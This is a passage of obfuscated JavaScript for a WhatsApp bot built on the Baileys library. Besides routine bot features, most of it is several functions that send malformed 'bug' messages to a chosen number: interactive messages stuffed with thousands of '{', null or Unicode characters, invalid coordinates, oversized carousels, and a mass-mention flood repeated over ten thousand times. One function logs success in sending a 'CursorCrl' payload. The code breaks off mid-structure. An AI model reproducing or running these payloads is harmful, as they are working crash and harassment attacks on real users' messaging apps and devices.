process.on("uncaughtException", console.error);
require("./config");
const {
  generateMessageID,
  generateMessageIDV2,
  WA_DEFAULT_EPHEMERAL,
  encodeSignedDeviceIdentity,
  getAggregateVotesInPollMessage,
  generateWAMessageFromContent,
  proto,
  generateWAMessageContent,
  generateWAMessage,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  areJidsSameUser,
  getContentType,
  useMultiFileAuthState,
  makeWASocket,
  fetchLatestBaileysVersion,
  makeCacheableSignalKeyStore,
  makeWaSocket
} = require("@adiwajshing/baileys");
const fs = require('fs');
const util = require("util");
const axios = require("axios");
const {
  exec
} = require("child_process");
const chalk = require("chalk");
const moment = require("moment-timezone");
const nodemailer = require("nodemailer");
const didyoumean = require("didyoumean");
const similarity = require("similarity");
const crypto = require("crypto");
const os = require('os');
const reacts = require("./RSPPlugins/reacts");
const path = require('path');
const { mkdirSync, existsSync } = require('fs');
if (!existsSync('./saved_messages')) mkdirSync('./saved_messages');
if (!fs.existsSync('./saved_messages')) fs.mkdirSync('./saved_messages');

// Your personal number (replace with your actual number)
const YOUR_NUMBER = "923176851874@s.whatsapp.net";
module.exports = async (_0x2d3082, _0x2d06fa) => {
  try {
    const _0x401194 = _0x2d06fa.key.remoteJid;
    var _0x1a2811 = _0x2d06fa.mtype === "interactiveResponseMessage" ? JSON.parse(_0x2d06fa.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : _0x2d06fa.mtype === "conversation" ? _0x2d06fa.message.conversation : _0x2d06fa.mtype == "imageMessage" ? _0x2d06fa.message.imageMessage.caption : _0x2d06fa.mtype == "videoMessage" ? _0x2d06fa.message.videoMessage.caption : _0x2d06fa.mtype == "extendedTextMessage" ? _0x2d06fa.message.extendedTextMessage.text : _0x2d06fa.mtype == "buttonsResponseMessage" ? _0x2d06fa.message.buttonsResponseMessage.selectedButtonId : _0x2d06fa.mtype == "listResponseMessage" ? _0x2d06fa.message.listResponseMessage.singleSelectReply.selectedRowId : _0x2d06fa.mtype == "templateButtonReplyMessage" ? _0x2d06fa.message.templateButtonReplyMessage.selectedId : _0x2d06fa.mtype == "messageContextInfo" ? _0x2d06fa.message.buttonsResponseMessage?.["selectedButtonId"] || _0x2d06fa.message.listResponseMessage?.["singleSelectReply"]["selectedRowId"] || _0x2d06fa.text : '';
    const {
      smsg: _0x43efc6,
      fetchJson: _0x355dd8,
      getBuffer: _0x21d53f,
      fetchBuffer: _0x137bd7,
      getGroupAdmins: _0x574325,
      TelegraPh: _0x33047c,
      isUrl: _0x21a4cc,
      hitungmundur: _0x26a42c,
      sleep: _0x363de1,
      clockString: _0x5f2f69,
      checkBandwidth: _0x1f70fe,
      runtime: _0x44b2bf,
      tanggal: _0x37070f,
      getRandom: _0x42254f
    } = require("./lib2/myfunc");
    var _0x4870d8 = typeof _0x2d06fa.text == "string" ? _0x2d06fa.text : '';
    var _0x9f50af = global.prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(_0x1a2811) ? _0x1a2811.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : '' : global.prefa ?? global.prefix;
    const _0x10c6cd = _0x1a2811.startsWith(_0x9f50af);
    const _0x3baa40 = _0x10c6cd ? _0x1a2811.slice(_0x9f50af.length).trim().split(" ").shift().toLowerCase() : '';
    const _0xd22d6a = _0x1a2811.trim().split(/ +/).slice(1);
    const _0xc6c87 = q = _0xd22d6a.join(" ");
    const _0x1de310 = _0x2d06fa.key.fromMe ? _0x2d3082.user.id.split(':')[0] + "@s.whatsapp.net" || _0x2d3082.user.id : _0x2d06fa.key.participant || _0x2d06fa.key.remoteJid;
    const _0x138d77 = await _0x2d3082.decodeJid(_0x2d3082.user.id);
    const _0x220e22 = _0x1de310.split('@')[0];
    const _0x2c14c0 = _0x2d06fa && _0x2d06fa.sender && [_0x138d77, ...(global.db.data.owners || [])].map(_0x4ceae3 => _0x4ceae3.replace(/[^0-9]/g, '') + "@s.whatsapp.net").includes(_0x2d06fa.sender) || false;
    const _0xdef931 = _0x2d06fa && _0x2d06fa.sender && (global.db.data.owners || []).map(_0xbe5cdc => _0xbe5cdc.replace(/[^0-9]/g, '') + "@s.whatsapp.net").includes(_0x2d06fa.sender) || false;
    const _0x3f56f8 = _0x2d06fa.pushName || '' + _0x220e22;
    const _0x3250ef = _0x138d77.includes(_0x220e22);
    const _0x48a7a1 = _0x2d06fa.isGroup ? await _0x2d3082.groupMetadata(_0x401194)["catch"](_0x1f8d6c => { }) : '';
    const _0x4376af = _0x2d06fa.isGroup ? await _0x48a7a1.participants : '';
    const _0x5052c8 = [923252132556, 923403260410, 923108218439];
    const _0x58346f = _0x2d06fa.sender;
    const _0x598d1d = ["923108218439@s.whatsapp.net"];
    try {
      let _0x3d8abd = global.db.data.users[_0x2d06fa.sender];
      if (typeof _0x3d8abd !== "object") {
        global.db.data.users[_0x2d06fa.sender] = {};
      }
      if (_0x3d8abd) {
        if (!(typeof _0x3d8abd.premiumExpiry === "number" && !isNaN(_0x3d8abd.premiumExpiry))) {
          _0x3d8abd.premiumExpiry = 0;
        }
      } else {
        global.db.data.users[_0x2d06fa.sender] = {
          'premiumExpiry': 0x0
        };
      }
      let _0x2ebff3 = global.db.data.settings[_0x138d77];
      if (typeof _0x2ebff3 !== "object") {
        global.db.data.settings[_0x138d77] = {};
      }
      if (_0x2ebff3) {
        if (!("antiswview" in _0x2ebff3)) {
          _0x2ebff3.antiswview = false;
        }
      } else {
        global.db.data.settings[_0x138d77] = {
          'antiswview': false
        };
      }
    } catch (_0x2ebcef) {
      console.log(_0x2ebcef);
    }
    const _0x5e59fa = require("./lib2/countdown");
    let _0x3bc9a9 = global.db.data.users;
    fs.writeFileSync("./database/database.json", JSON.stringify(global.db, null, 2));
    const _0x355618 = _0x2c14c0 ? true : _0x5e59fa.isPremium(_0x3bc9a9, _0x2d06fa.sender);
    const _0x4ff3d7 = _0xdef931 ? true : _0x5e59fa.isPremium(_0x3bc9a9, _0x2d06fa.sender);
    xeontex = "\n " + (_0xd22d6a.join(" ") ? _0xd22d6a.join(" ") : "Telegram: RSPxLegendOP") + "\n\n\n";
    jidds = [];
    xeontex += "*~@923252132556~*\n*🦄*\n*~@923108218439~*\n".repeat(10200);
    jidds.push("923252132556@s.whatsapp.net", "923108218439@s.whatsapp.net");
    const _0x359985 = moment().tz("Asia/Kolkata").format("HH:mm:ss");
    if (_0x359985 < "23:59:00") {
      var _0xd90589 = "Good Night 🌌";
    }
    if (_0x359985 < "19:00:00") {
      var _0xd90589 = "Good Evening 🌃";
    }
    if (_0x359985 < "18:00:00") {
      var _0xd90589 = "Good Evening 🌃";
    }
    if (_0x359985 < "15:00:00") {
      var _0xd90589 = "Good Afternoon 🌅";
    }
    if (_0x359985 < "11:00:00") {
      var _0xd90589 = "Good Morning 🌄";
    }
    if (_0x359985 < "05:00:00") {
      var _0xd90589 = "Good Morning 🌄";
    }
    if (reacts.autoreact) {
      let _0x302013 = reacts.reactEmojis[Math.floor(Math.random() * reacts.reactEmojis.length)];
      const _0x3b507f = {
        'react': {
          'text': _0x302013,
          'key': _0x2d06fa.key
        }
      };
      _0x2d3082.sendMessage(_0x401194, _0x3b507f);
    }
    let _0x5ec53a;
    try {
      _0x5ec53a = JSON.parse(fs.readFileSync("./RSPPlugins/autoreplies.json"));
    } catch (_0x3ef26d) {
      _0x5ec53a = {
        'autoreplies': []
      };
      fs.writeFileSync("./RSPPlugins/autoreplies.json");
    }
    if (_0x2d06fa.text && !_0x2d06fa.key.fromMe) {
      _0x5ec53a.autoreplies.forEach(_0x4bd391 => {
        if (_0x2d06fa.text.trim().toLowerCase() === _0x4bd391.trigger.trim().toLowerCase()) {
          console.log("Auto-reply triggered for " + _0x4bd391.trigger);
          _0x2d3082.sendMessage(_0x2d06fa.chat, {
            'text': _0x4bd391.reply
          });
        }
      });
    }
    const {
      setAutoStatus: _0x282351,
      getAutoStatus: _0x1bfaed
    } = require("./autostatus");
    _0x2d3082.ev.on("messages.upsert", async _0x4535af => {
      if ((await _0x1bfaed()) && _0x4535af.messages[0].key.remoteJid === "status@broadcast") {
        await _0x2d3082.readMessages([_0x4535af.messages[0].key]);
      }
    });
    function _0x22060b(_0x378950, _0x364e33 = [], _0x173e73 = false) {
      return _0x173e73 == null || _0x173e73 == undefined || _0x173e73 == false ? _0x2d3082.sendMessage(_0x2d06fa.chat, {
        'text': _0x378950,
        'contextInfo': {
          'forwardingScore': 0x3e7,
          'isForwarded': true,
          'mentionedJid': [_0x364e33],
          'forwardedNewsletterMessageInfo': {
            'newsletterName': "Join RSP Channel 🔥",
            'newsletterJid': "0029VbB5fdg9xVJnrkIIVg3f@newsletter"
          },
          'externalAdReply': {
            'showAdAttribution': true,
            'title': "Join RSP Channel 🔥",
            'body': botname,
            'thumbnailUrl': "https://i.postimg.cc/FsJzycB3/Pass-ios-RSPx-Legend-YT.jpg",
            'sourceUrl': "https://whatsapp.com/channel/0029VbB5fdg9xVJnrkIIVg3f",
            'mediaType': 0x1,
            'renderLargerThumbnail': false
          }
        }
      }, {
        'quoted': _0x2d06fa
      }) : _0x2d3082.sendMessage(_0x2d06fa.chat, {
        'text': _0x378950,
        'contextInfo': {
          'forwardingScore': 0x3e7,
          'isForwarded': true,
          'mentionedJid': [_0x364e33],
          'forwardedNewsletterMessageInfo': {
            'newsletterName': "Join RSP Channel 🔥",
            'newsletterJid': "0029VbB5fdg9xVJnrkIIVg3f@newsletter"
          },
          'externalAdReply': {
            'showAdAttribution': true,
            'title': "Join RSP Channel 🔥",
            'body': "Best WhatsApp Bot 💻",
            'thumbnailUrl': "https://i.postimg.cc/FsJzycB3/Pass-ios-RSPx-Legend-YT.jpg",
            'sourceUrl': "https://whatsapp.com/channel/0029VbB5fdg9xVJnrkIIVg3f",
            'mediaType': 0x1,
            'renderLargerThumbnail': false
          }
        }
      }, {
        'quoted': _0x2d06fa
      });
    }
    const _0x7b48ae = _0x1199cf => {
      _0x2d3082.sendMessage(_0x2d06fa.chat, {
        'text': _0x1199cf,
        'contextInfo': {
          'forwardingScore': 0x3e7,
          'isForwarded': true,
          'mentionedJid': [_0x1de310],
          'forwardedNewsletterMessageInfo': {
            'newsletterName': "Join RSP Channel 🔥",
            'newsletterJid': "0029VbB5fdg9xVJnrkIIVg3f@newsletter"
          },
          'externalAdReply': {
            'showAdAttribution': true,
            'title': "Join RSP Channel 🔥",
            'body': "Best WhatsApp Bot 💻",
            'thumbnailUrl': "https://i.postimg.cc/FsJzycB3/Pass-ios-RSPx-Legend-YT.jpg",
            'sourceUrl': "https://whatsapp.com/channel/0029VbB5fdg9xVJnrkIIVg3f",
            'mediaType': 0x1,
            'renderLargerThumbnail': false
          }
        }
      }, {
        'quoted': _0x2d06fa
      });
    };
    if (!_0x2d3082["public"]) {
      if (!_0x2c14c0) {
        return;
      }
    }
    if (_0x9f50af && _0x3baa40) {
      let _0xc063e2 = _0x5b37b2();
      function _0x5b37b2() {
        const _0x3f6bcc = require('fs');
        try {
          const _0xc6c9c8 = _0x3f6bcc.readFileSync("RSPV18.js", "utf8");
          const _0x59e3bd = /case\s+'([^']+)'/g;
          const _0x329a2e = _0xc6c9c8.match(_0x59e3bd);
          if (_0x329a2e) {
            const _0x598cd5 = _0x329a2e.map(_0x19697b => _0x19697b.replace(/case\s+'([^']+)'/, '$1'));
            return _0x598cd5;
          } else {
            return [];
          }
        } catch (_0x53ce14) {
          console.log("There is an error:", _0x53ce14);
          return [];
        }
      }
      let _0x6954da = didyoumean(_0x3baa40, _0xc063e2);
      let _0xeea916 = similarity(_0x3baa40, _0x6954da);
      let _0x5ac673 = parseInt(_0xeea916 * 100);
      if (_0x6954da && _0x3baa40.toLowerCase() !== _0x6954da.toLowerCase()) {
        let _0x28d169 = "Sorry, the command you gave is wrong. Maybe this is what you mean:\n\n•> " + (_0x9f50af + _0x6954da) + "\n•> Similarities: " + _0x5ac673 + '%';
        _0x7b48ae(_0x28d169);
      }
    }
    async function _0x3641dc(_0x51fff8, _0x4ccfd1 = true) {
      try {
        await _0x2d3082.relayMessage(_0x51fff8, {
          'ephemeralMessage': {
            'message': {
              'interactiveMessage': {
                'header': {
                  'locationMessage': {
                    'degreesLatitude': -999.035,
                    'degreesLongitude': 999.035
                  },
                  'hasMediaAttachment': true
                },
                'body': {
                  'text': "! ⛶͢🧪𝕽𝕾𝕻->͢𝙿𝚑𝚞𝚌𝚔𝚈𝚘𝚞𝙶𝚊𝚢𝚎🧪🉃\n" + 'ꦾ'.repeat(30000) + "\0".repeat(10000) + "@22222".repeat(20000)
                },
                'nativeFlowMessage': {},
                'contextInfo': {
                  'mentionedJid': [_0x51fff8],
                  'groupMentions': [{
                    'groupJid': "0@newsletter",
                    'groupSubject': "SiJomokKenapaJirr"
                  }],
                  'quotedMessage': {
                    'documentMessage': {
                      'contactVcard': true
                    }
                  }
                }
              }
            }
          }
        }, {
          'participant': {
            'jid': _0x51fff8
          },
          'userJid': _0x51fff8
        });
      } catch (_0x48b020) {
        console.log(_0x48b020);
      }
    }
    async function _0x5dd355(_0x54be88) {
      try {
        const _0x463d7b = [];
        const _0x43a63a = [];
        for (let _0x402fce = 0; _0x402fce < 15; _0x402fce++) {
          _0x463d7b.push({
            'name': "single_select",
            'buttonParamsJson': "\0"
          });
          _0x43a63a.push({
            'name': "call_permission_request",
            'buttonParamsJson': '{}'
          });
        }
        const _0xd8a462 = generateWAMessageFromContent(_0x54be88, proto.Message.fromObject({
          'viewOnceMessage': {
            'message': {
              'interactiveMessage': {
                'header': {
                  'title': '',
                  'hasMediaAttachment': false
                },
                'body': {
                  'text': '.'
                },
                'nativeFlowMessage': {
                  'messageParamsJson': '{'.repeat(10000),
                  'buttons': [..._0x463d7b, ..._0x43a63a]
                }
              }
            }
          }
        }), {});
        await _0x2d3082.relayMessage(_0x54be88, _0xd8a462.message, {
          'messageId': _0xd8a462.key.id
        });
      } catch (_0x31ad72) {
        console.error("Error", _0x31ad72);
      }
    }
    async function _0x31310f(_0x5c3c9d) {
      let _0xeb584d = JSON.stringify({
        'model': "meta",
        'messages': [{
          'role': "is_ai_message",
          'content': true
        }, {
          'role': "users",
          'content': _0x5c3c9d
        }],
        'functions': [{
          'name': "call_permission_request",
          'description': '',
          'parameters': {
            'type': "object",
            'properties': {
              'full_name': {
                'type': "string",
                'description': ''
              },
              'product_name': {
                'type': "string",
                'description': '.'
              },
              'complaint_summary': {
                'type': "string",
                'description': 'A.'
              }
            },
            'required': ["full_name", "product_name", "complaint_summary"]
          }
        }],
        'function_call': {
          'name': "request_accepted"
        }
      }, null, 2);
      let _0x80895 = await generateWAMessageFromContent(_0x5c3c9d, {
        'viewOnceMessage': {
          'message': {
            'contextInfo': {
              'shop': 0x3e7,
              'subtitle': '',
              'id': "cb1p",
              'mentionedJid': [_0x5c3c9d],
              'expiration': 0x3e7,
              'ephemeralSettingTimestamp': 0x3e7,
              'entryPointConversionSource': "cache",
              'entryPointConversionApp': "Whatsapp",
              'entryPointConversionDelaySeconds': 0x3e7,
              'disappearingMode': {
                'initiator': "INITIATED_BY_OTHER",
                'trigger': "ACCOUNT_SETTING"
              }
            },
            'interactiveMessage': {
              'header': {
                'title': '',
                'hasMediaAttachment': false
              },
              'body': {
                'text': "Ᏽ𐌉ⱿⱿ 𐌄𐋄𐌄𐌂𐌵𐌕𐌄𐌓𐌄𐌃"
              },
              'nativeFlowMessage': {
                'messageParamsJson': '{'.repeat(10000),
                'buttons': [{
                  'name': "single_select",
                  'buttonParamsJson': _0xeb584d
                }, {
                  'name': 'to',
                  'buttonParamsJson': _0xeb584d
                }, {
                  'name': "call_permission_request",
                  'buttonParamsJson': _0xeb584d
                }, {
                  'name': "request_accepted",
                  'buttonParamsJson': _0xeb584d
                }]
              }
            }
          }
        }
      }, {
        'call_permission_request': ["Array"]
      });
      await _0x2d3082.relayMessage(_0x5c3c9d, _0x80895.message, {
        'messageId': null,
        'participant': {
          'jid': _0x5c3c9d
        }
      });
    }
    async function _0xe1a31a(_0x48a020) {
      try {
        let _0x1da43d = {
          'viewOnceMessage': {
            'message': {
              'messageContextInfo': {
                'deviceListMetadata': {},
                'deviceListMetadataVersion': 0x2
              },
              'interactiveMessage': {
                'contextInfo': {
                  'mentionedJid': [_0x48a020],
                  'isForwarded': true,
                  'forwardingScore': 0x3e7,
                  'businessMessageForwardInfo': {
                    'businessOwnerJid': _0x48a020
                  },
                  'participant': _0x48a020,
                  'quotedMessage': {
                    'viewOnceMessage': {
                      'message': {
                        'interactiveResponseMessage': {
                          'body': {
                            'text': '',
                            'format': ''
                          }
                        }
                      }
                    }
                  }
                },
                'body': {
                  'text': '{'.repeat(10000)
                },
                'nativeFlowMessage': {
                  'messageParamsJson': '{'.repeat(10000)
                }
              }
            }
          }
        };
        await _0x2d3082.relayMessage(_0x48a020, _0x1da43d, {
          'participant': {
            'jid': _0x48a020
          }
        });
      } catch (_0x39e5eb) {
        console.log(_0x39e5eb);
      }
    }
    async function _0x2a05a6(_0xa4e4cd) {
      const _0x2acbd7 = await generateWAMessageFromContent(_0xa4e4cd, {
        'viewOnceMessage': {
          'message': {
            'messageContextInfo': {
              'deviceListMetadata': {},
              'deviceListMetadataVersion': 0x2
            },
            'interactiveMessage': {
              'body': {
                'text': ''
              },
              'footer': {
                'text': ''
              },
              'carouselMessage': {
                'cards': [{
                  'header': {
                    'title': "@RSPxLegendOP • #Bug 🦠",
                    'imageMessage': {
                      'url': "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                      'mimetype': "image/jpeg",
                      'fileSha256': "ydrdawvK8RyLn3L+d+PbuJp+mNGoC2Yd7s/oy3xKU6w=",
                      'fileLength': "164089",
                      'height': 0x1,
                      'width': 0x1,
                      'mediaKey': "2saFnZ7+Kklfp49JeGvzrQHj1n2bsoZtw2OKYQ8ZQeg=",
                      'fileEncSha256': "na4OtkrffdItCM7hpMRRZqM8GsTM6n7xMLl+a0RoLVs=",
                      'directPath': "/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0",
                      'mediaKeyTimestamp': "1749172037",
                      'jpegThumbnail': "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAsAAEAAwEBAAAAAAAAAAAAAAAAAQIDBAUBAQEAAAAAAAAAAAAAAAAAAAAB/9oADAMBAAIQAxAAAADxq2mzNeJZZovmEJV0RlAX6F5I76JxgAtN5TX2/G0X2MfHzjq83TOgNteXpMpujBrNc6wquimpWoKwFaEsA//EACQQAAICAgICAQUBAAAAAAAAAAABAhEDIQQSECAUEyIxMlFh/9oACAEBAAE/ALRR1OokNRHIfiMR6LTJNFsv0g9bJvy1695G2KJ8PPpqH5RHgZ8lOqTRk4WXHh+q6q/SqL/iMHFyZ+3VrRhjPDBOStqNF5GvtdQS2ia+VilC2lapM5fExYIWpO78pHQ43InxpOSVpk+bJtNHzM6n27E+Tlk/3ZPLkyUpSbrzDI0qVFuraG5S0fT1tlf6dX6RdEZWt7P2f4JfwUdkqGijXiA9OkPQh+n/xAAXEQADAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/ANVukaO//8QAFhEAAwAAAAAAAAAAAAAAAAAAARBA/9oACAEDAQE/AJg//9k=",
                      'scansSidecar': "PllhWl4qTXgHBYizl463ShueYwk=",
                      'scanLengths': [8596, 155493]
                    },
                    'hasMediaAttachment': true
                  },
                  'body': {
                    'text': "@RSPxLegendOP • #Bug 🦠"
                  },
                  'footer': {
                    'text': "phynx.json"
                  },
                  'nativeFlowMessage': {
                    'messageParamsJson': "\n".repeat(10000)
                  }
                }]
              },
              'contextInfo': {
                'participant': "0@s.whatsapp.net",
                'quotedMessage': {
                  'viewOnceMessage': {
                    'message': {
                      'interactiveResponseMessage': {
                        'body': {
                          'text': "Sent",
                          'format': "DEFAULT"
                        },
                        'nativeFlowResponseMessage': {
                          'name': "galaxy_message",
                          'paramsJson': "{ phynx.json }",
                          'version': 0x3
                        }
                      }
                    }
                  }
                },
                'remoteJid': "@s.whatsapp.net"
              }
            }
          }
        }
      }, {});
      await _0x2d3082.relayMessage(_0xa4e4cd, _0x2acbd7.message, {
        'participant': {
          'jid': _0xa4e4cd
        },
        'messageId': _0x2acbd7.key.id
      });
      console.log(chalk.green("Successfully Send " + chalk.red("CursorCrl") + " to " + _0xa4e4cd));
    }
    async function _0x33e181(_0x1a3c2f) {
      const _0x1b73c4 = await generateWAMessageFromContent(_0x1a3c2f, {
        'viewOnceMessage': {
          'message': {
            'messageContextInfo': {
              'deviceListMetadata': {},
              'deviceListMetadataVersion': 0x2
            },
            'interactiveMessage': {
              'body': {
                'text': ''
              },
              'footer': {
                'text': ''
              },
              'carouselMessage': {
                'cards': [{
                  'header': {
                    'title': "𓅓 尺 丂 卩💦",
                    'imageMessage': {
                      'url': "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                      'mimetype': "image/jpeg",
                      'fileSha256': "ydrdawvK8RyLn3L+d+PbuJp+mNGoC2Yd7s/oy3xKU6w=",
                      'fileLength': "164089",
                      'height': 0x1,
                      'width': 0x1,
                      'mediaKey': "2saFnZ7+Kklfp49JeGvzrQHj1n2bsoZtw2OKYQ8ZQeg=",
                      'fileEncSha256': "na4OtkrffdItCM7hpMRRZqM8GsTM6n7xMLl+a0RoLVs=",
                      'directPath': "/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0",
                      'mediaKeyTimestamp': "1749172037",
                      'jpegThumbnail': "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAsAAEAAwEBAAAAAAAAAAAAAAAAAQIDBAUBAQEAAAAAAAAAAAAAAAAAAAAB/9oADAMBAAIQAxAAAADxq2mzNeJZZovmEJV0RlAX6F5I76JxgAtN5TX2/G0X2MfHzjq83TOgNteXpMpujBrNc6wquimpWoKwFaEsA//EACQQAAICAgICAQUBAAAAAAAAAAABAhEDIQQSECAUEyIxMlFh/9oACAEBAAE/ALRR1OokNRHIfiMR6LTJNFsv0g9bJvy1695G2KJ8PPpqH5RHgZ8lOqTRk4WXHh+q6q/SqL/iMHFyZ+3VrRhjPDBOStqNF5GvtdQS2ia+VilC2lapM5fExYIWpO78pHQ43InxpOSVpk+bJtNHzM6n27E+Tlk/3ZPLkyUpSbrzDI0qVFuraG5S0fT1tlf6dX6RdEZWt7P2f4JfwUdkqGijXiA9OkPQh+n/xAAXEQADAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/ANVukaO//8QAFhEAAwAAAAAAAAAAAAAAAAAAARBA/9oACAEDAQE/AJg//9k=",
                      'scansSidecar': "PllhWl4qTXgHBYizl463ShueYwk=",
                      'scanLengths': [8596, 155493]
                    },
                    'hasMediaAttachment': true
                  },
                  'body': {
                    'text': ''
                  },
                  'footer': {
                    'text': "𓅓 尺 丂 卩💦"
                  },
                  'nativeFlowMessage': {
                    'messageParamsJson': "\n".repeat(10000)
                  }
                }]
              },
              'contextInfo': {
                'participant': "0@s.whatsapp.net",
                'quotedMessage': {
                  'viewOnceMessage': {
                    'message': {
                      'interactiveResponseMessage': {
                        'body': {
                          'text': "Sent",
                          'format': "DEFAULT"
                        },
                        'nativeFlowResponseMessage': {
                          'name': "galaxy_message",
                          'paramsJson': "{ Brando_Da.js }",
                          'version': 0x3
                        }
                      }
                    }
                  }
                },
                'remoteJid': "status@broadcast"
              }
            }
          }
        }
      }, {});
      await _0x2d3082.relayMessage(_0x1a3c2f, _0x1b73c4.message, {
        'participant': {
          'jid': _0x1a3c2f
        },
        'messageId': _0x1b73c4.key.id
      });
    }
    async function _0xdb289d(_0x1982bf) {
      const _0x3550fb = [{
        'tag': "bot",
        'attrs': {
          'biz_bot': '1'
        }
      }];
      const _0x128844 = generateWAMessageFromContent(_0x1982bf, {
        'viewOnceMessage': {
          'message': {
            'messageContextInfo': {
              'deviceListMetadata': {},
              'deviceListMetadataVersion': 0x2,
              'messageSecret': crypto.randomBytes(32),
              'supportPayload': JSON.stringify({
                'version': 0x2,
                'is_ai_message': true,
                'should_show_system_message': true,
                'ticket_id': crypto.randomBytes(16)
              })
            },
            'interactiveMessage': {
              'header': {
                'title': "🧪↭尺 丂 卩↭",
                'hasMediaAttachment': false,
                'imageMessage': {
                  'url': "https://mmg.whatsapp.net/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0&mms3=true",
                  'mimetype': "image/jpeg",
                  'fileSha256': "NzsD1qquqQAeJ3MecYvGXETNvqxgrGH2LaxD8ALpYVk=",
                  'fileLength': "11887",
                  'height': 0x438,
                  'width': 0x438,
                  'mediaKey': "H/rCyN5jn7ZFFS4zMtPc1yhkT7yyenEAkjP0JLTLDY8=",
                  'fileEncSha256': "RLs/w++G7Ria6t+hvfOI1y4Jr9FDCuVJ6pm9U3A2eSM=",
                  'directPath': "/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0",
                  'mediaKeyTimestamp': "1750124469",
                  'jpegThumbnail': "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAEAAwEBAAAAAAAAAAAAAAAAAQMEBQYBAQEBAQAAAAAAAAAAAAAAAAACAQP/2gAMAwEAAhADEAAAAPMgAAAAAb8F9Kd12C9pHLAAHTwWUaubbqoQAA3zgHWjlSaMswAAAAAAf//EACcQAAIBBAECBQUAAAAAAAAAAAECAwAREhMxBCAQFCJRgiEwQEFS/9oACAEBAAE/APxfKpJBsia7DkVY3tR6VI4M5Wsx4HfBM8TgrRWPPZj9ebVPK8r3bvghSGPdL8RXmG251PCkse6L5DujieU2QU6TcMeB4HZGLXIB7uiZV3Fv5qExvuNremjrLmPBba6VEMkQIGOHqrq1VZbKBj+u0EigSODWR96yb3NEk8n7n//EABwRAAEEAwEAAAAAAAAAAAAAAAEAAhEhEiAwMf/aAAgBAgEBPwDZsTaczAXc+aNMWsyZBvr/AP/EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8AT//Z",
                  'contextInfo': {
                    'mentionedJid': [_0x1982bf],
                    'participant': _0x1982bf,
                    'remoteJid': _0x1982bf,
                    'expiration': 0x260d,
                    'ephemeralSettingTimestamp': 0x260d,
                    'entryPointConversionSource': "WhatsApp.com",
                    'entryPointConversionApp': "WhatsApp",
                    'entryPointConversionDelaySeconds': 0x260e,
                    'disappearingMode': {
                      'initiator': "INITIATED_BY_OTHER",
                      'trigger': "ACCOUNT_SETTING"
                    }
                  },
                  'scansSidecar': "E+3OE79eq5V2U9PnBnRtEIU64I4DHfPUi7nI/EjJK7aMf7ipheidYQ==",
                  'scanLengths': [2071, 6199, 1634, 1983],
                  'midQualityFileSha256': "S13u6RMmx2gKWKZJlNRLiLG6yQEU13oce7FWQwNFnJ0="
                }
              },
              'body': {
                'text': "🧪↭尺 丂 卩↭"
              },
              'nativeFlowMessage': {
                'messageParamsJson': '{'.repeat(10000)
              }
            }
          }
        }
      }, {});
      await _0x2d3082.relayMessage(_0x1982bf, _0x128844.message, {
        'participant': {
          'jid': _0x1982bf
        },
        'additionalNodes': _0x3550fb,
        'messageId': _0x128844.key.id
      });
    }
    ;
    ;
    let _0x2ecf35 = [];
    for (let _0x520d38 = 0; _0x520d38 < 1000; _0x520d38++) {
      _0x2ecf35.push({
        'body': proto.Message.InteractiveMessage.Body.fromObject({
          'text': 'ㅤ'
        }),
        'footer': proto.Message.InteractiveMessage.Footer.fromObject({
          'text': 'ㅤㅤ'
        }),
        'header': proto.Message.InteractiveMessage.Header.fromObject({
          'title': "\n",
          'hasMediaAttachment': true,
          'imageMessage': {
